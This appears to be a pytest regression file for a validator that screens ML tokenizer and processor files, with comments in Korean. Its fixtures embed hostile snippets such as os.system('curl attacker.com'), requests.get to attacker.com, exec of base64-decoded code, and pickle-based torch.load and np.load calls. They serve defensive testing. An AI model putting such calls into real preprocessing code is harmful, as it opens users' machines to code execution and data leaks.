"""Regression tests for preprocessing_validator.

Tests use validate_preprocessing_file() (internal result) so they can run
without the full analyzer.schemas package installed.

Run: pytest tests/test_preprocessing_validator.py -v
"""

import pytest
from analyzer.validators.preprocessing_validator import (
    classify_file,
    validate_preprocessing_file,
    PREPROCESSING_FILE_TYPES,
)


# ────────────────────────────────────────────────────────────────────────────
# 파일 종류 분류 테스트
# ────────────────────────────────────────────────────────────────────────────

class TestClassifyFile:
    def test_tokenizer(self):
        assert classify_file("tokenization_bert.py") == "TOKENIZER"

    def test_processor(self):
        assert classify_file("processing_whisper.py") == "PROCESSOR"

    def test_image_processor(self):
        assert classify_file("image_processing_clip.py") == "IMAGE_PROCESSOR"

    def test_feature_extractor(self):
        assert classify_file("feature_extraction_wav2vec2.py") == "FEATURE_EXTRACTOR"

    def test_modeling(self):
        assert classify_file("modeling_bert.py") == "MODELING"

    def test_unknown(self):
        assert classify_file("some_random_file.py") == "UNKNOWN"


# ────────────────────────────────────────────────────────────────────────────
# 정상 파일 — B-2/PENDING_REVIEW (전처리 파일 자동 승인 불가 정책)
# ────────────────────────────────────────────────────────────────────────────

class TestNormalPreprocessingFilesAreB2:
    """
    전처리 파일은 위험 패턴이 없어도 B-2/PENDING_REVIEW 가 기본.
    semantic/invariant check 없이 B-1/PASS 자동 승인 불가.
    """

    def test_normal_tokenizer_is_b2(self):
        code = (
            "import re\n"
            "import unicodedata\n"
            "class BertTokenizer:\n"
            "    def tokenize(self, text):\n"
            "        return re.findall(r'[a-z]+', text)\n"
        )
        r = validate_preprocessing_file(code, "tokenization_bert.py")
        assert r.grade == "B-2"
        assert r.status == "PENDING_REVIEW"
        assert r.verification_step == "CODE_SANDBOX_RUNTIME"

    def test_normal_processor_is_b2(self):
        code = (
            "import numpy as np\n"
            "import torch\n"
            "class WhisperProcessor:\n"
            "    def process(self, audio):\n"
            "        return torch.tensor(np.array(audio))\n"
        )
        r = validate_preprocessing_file(code, "processing_whisper.py")
        assert r.grade == "B-2"
        assert r.status == "PENDING_REVIEW"

    def test_normal_image_processor_is_b2(self):
        code = (
            "import numpy as np\n"
            "from PIL import Image\n"
            "class CLIPImageProcessor:\n"
            "    def preprocess(self, path):\n"
            "        img = Image.open(path)\n"
            "        return np.array(img) / 255.0\n"
        )
        r = validate_preprocessing_file(code, "image_processing_clip.py")
        assert r.grade == "B-2"
        assert r.status == "PENDING_REVIEW"

    def test_normal_feature_extractor_is_b2(self):
        code = (
            "import numpy as np\n"
            "import torch\n"
            "class FeatureExtractor:\n"
            "    def extract(self, x):\n"
            "        return torch.tensor(np.array(x))\n"
        )
        r = validate_preprocessing_file(code, "feature_extraction_wav2vec2.py")
        assert r.grade == "B-2"
        assert r.status == "PENDING_REVIEW"


# ────────────────────────────────────────────────────────────────────────────
# 위험 패턴 탐지 → C/BLOCK
# ────────────────────────────────────────────────────────────────────────────

class TestDangerousPatternBlocked:

    def test_eval_blocked(self):
        code = (
            "import re\n"
            "class EvilTokenizer:\n"
            "    def tokenize(self, text):\n"
            "        eval('os.system(\"id\")')\n"
            "        return re.findall(r'[a-z]+', text)\n"
        )
        r = validate_preprocessing_file(code, "tokenization_evil.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"
        assert r.blocked is True

    def test_torch_load_blocked(self):
        code = (
            "import torch\n"
            "class EvilProcessor:\n"
            "    def process(self, path):\n"
            "        return torch.load(path)\n"
        )
        r = validate_preprocessing_file(code, "processing_evil.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_torch_load_alias_blocked(self):
        code = (
            "import torch as t\n"
            "class EvilProcessor:\n"
            "    def process(self, path):\n"
            "        return t.load(path)\n"
        )
        r = validate_preprocessing_file(code, "processing_evil.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_from_torch_import_load_blocked(self):
        code = (
            "from torch import load\n"
            "class EvilProcessor:\n"
            "    def process(self, path):\n"
            "        return load(path)\n"
        )
        r = validate_preprocessing_file(code, "processing_evil.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_numpy_load_allow_pickle_alias_blocked(self):
        code = (
            "import numpy as np\n"
            "class EvilProcessor:\n"
            "    def process(self, path):\n"
            "        return np.load(path, allow_pickle=True)\n"
        )
        r = validate_preprocessing_file(code, "processing_evil.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_from_numpy_import_load_alias_blocked(self):
        code = (
            "from numpy import load as npload\n"
            "class EvilProcessor:\n"
            "    def process(self, path):\n"
            "        return npload(path, allow_pickle=True)\n"
        )
        r = validate_preprocessing_file(code, "processing_evil.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_os_system_blocked(self):
        code = (
            "import os\n"
            "import numpy as np\n"
            "class EvilProcessor:\n"
            "    def process(self, x):\n"
            "        os.system('curl attacker.com')\n"
            "        return np.array(x)\n"
        )
        r = validate_preprocessing_file(code, "image_processing_evil.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_yaml_load_blocked(self):
        code = (
            "import re\n"
            "import yaml\n"
            "class YamlTokenizer:\n"
            "    def __init__(self, f):\n"
            "        self.vocab = yaml.load(open(f))\n"
            "    def tokenize(self, text):\n"
            "        return re.findall(r'[a-z]+', text)\n"
        )
        r = validate_preprocessing_file(code, "tokenization_yaml.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_exec_blocked(self):
        code = (
            "import base64\n"
            "exec(base64.b64decode('aW1wb3J0IG9z'))\n"
        )
        r = validate_preprocessing_file(code, "tokenization_obfuscated.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_from_os_import_system_blocked(self):
        code = (
            "import re\n"
            "from os import system\n"
            "class EvilTokenizer:\n"
            "    def tokenize(self, text):\n"
            "        system('curl attacker.com')\n"
            "        return re.findall(r'[a-z]+', text)\n"
        )
        r = validate_preprocessing_file(code, "tokenization_evil2.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_getattr_os_system_blocked(self):
        code = (
            "import os\n"
            "import re\n"
            "class EvilTokenizer:\n"
            "    def tokenize(self, text):\n"
            "        fn = getattr(os, 'system')\n"
            "        fn('curl attacker.com')\n"
            "        return re.findall(r'[a-z]+', text)\n"
        )
        r = validate_preprocessing_file(code, "tokenization_evil3.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_requests_blocked(self):
        code = (
            "import numpy as np\n"
            "import requests\n"
            "class EvilProcessor:\n"
            "    def process(self, x):\n"
            "        requests.get('http://attacker.com')\n"
            "        return np.array(x)\n"
        )
        r = validate_preprocessing_file(code, "processing_evil.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"

    def test_requests_alias_blocked(self):
        code = (
            "import numpy as np\n"
            "import requests as r\n"
            "class EvilProcessor:\n"
            "    def process(self, x):\n"
            "        r.get('http://attacker.com')\n"
            "        return np.array(x)\n"
        )
        r = validate_preprocessing_file(code, "processing_evil.py")
        assert r.grade == "C"
        assert r.status == "BLOCK"


# ────────────────────────────────────────────────────────────────────────────
# 신규 API → B-2
# ────────────────────────────────────────────────────────────────────────────

class TestUnregisteredApiIsB2:

    def test_unknown_library_is_b2(self):
        code = (
            "import numpy as np\n"
            "import torch\n"
            "import custom_audio_lib\n"
            "class CustomProcessor:\n"
            "    def process(self, audio):\n"
            "        processed = custom_audio_lib.normalize(audio)\n"
            "        return torch.tensor(np.array(processed))\n"
        )
        r = validate_preprocessing_file(code, "processing_custom.py")
        assert r.grade == "B-2"
        assert r.status == "PENDING_REVIEW"
        assert "import custom_audio_lib" in r.new_apis


# ────────────────────────────────────────────────────────────────────────────
# 정책 고정 확인
# ────────────────────────────────────────────────────────────────────────────

class TestPreprocessingPolicy:
    """
    핵심 정책이 흔들리지 않는지 확인하는 테스트.
    이 테스트가 실패하면 정책 변경으로 간주한다.
    """

    def test_preprocessing_types_defined(self):
        assert "TOKENIZER" in PREPROCESSING_FILE_TYPES
        assert "PROCESSOR" in PREPROCESSING_FILE_TYPES
        assert "IMAGE_PROCESSOR" in PREPROCESSING_FILE_TYPES
        assert "FEATURE_EXTRACTOR" in PREPROCESSING_FILE_TYPES

    def test_tokenizer_cannot_be_b1(self):
        """정상 tokenizer 파일이 B-1/PASS 가 되면 정책 위반."""
        code = (
            "import re\n"
            "class SimpleTokenizer:\n"
            "    def tokenize(self, text):\n"
            "        return re.findall(r'[a-z]+', text)\n"
        )
        r = validate_preprocessing_file(code, "tokenization_simple.py")
        assert r.grade != "B-1", (
            "전처리 파일은 semantic check 없이 B-1 자동 승인 불가 정책 위반"
        )
        assert r.status != "PASS", (
            "전처리 파일은 semantic check 없이 PASS 자동 승인 불가 정책 위반"
        )

    def test_processor_cannot_be_b1(self):
        code = (
            "import numpy as np\n"
            "import torch\n"
            "class SimpleProcessor:\n"
            "    def process(self, x):\n"
            "        return torch.tensor(np.array(x))\n"
        )
        r = validate_preprocessing_file(code, "processing_simple.py")
        assert r.grade != "B-1"
        assert r.status != "PASS"

    def test_image_processor_cannot_be_b1(self):
        code = (
            "import numpy as np\n"
            "class SimpleImageProcessor:\n"
            "    def process(self, x):\n"
            "        return np.array(x) / 255.0\n"
        )
        r = validate_preprocessing_file(code, "image_processing_simple.py")
        assert r.grade != "B-1"
        assert r.status != "PASS"
